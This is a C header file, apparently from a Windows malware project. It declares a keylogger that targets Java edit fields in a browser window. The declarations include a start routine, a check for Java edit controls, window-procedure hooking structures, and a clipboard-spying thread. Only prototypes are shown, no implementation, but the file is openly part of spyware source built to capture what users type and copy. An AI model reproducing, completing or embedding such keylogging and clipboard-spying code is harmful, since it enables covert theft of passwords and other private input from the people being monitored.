#ifndef JavaKeyLogH
#define JavaKeyLogH
//----------------------------------------------------------------------------

//LRESULT WINAPI KLogWndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
//extern HWND hNextViewer;
//LRESULT WINAPI CBSpyWndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
DWORD WINAPI CBSpyThread(LPVOID tmp);
bool EnumWnds(HWND hWnd);
//extern char szUrl[512];
//extern bool bKLogActive;

struct WNDS
{
    HWND hWnd;
    WNDPROC lpWndProc;
};

void StartJavaKeyLogger();

bool IsJavaEdit(HWND Wnd, DWORD Level);

extern HWND hBrowserWnd;

//----------------------------------------------------------------------------
#endif
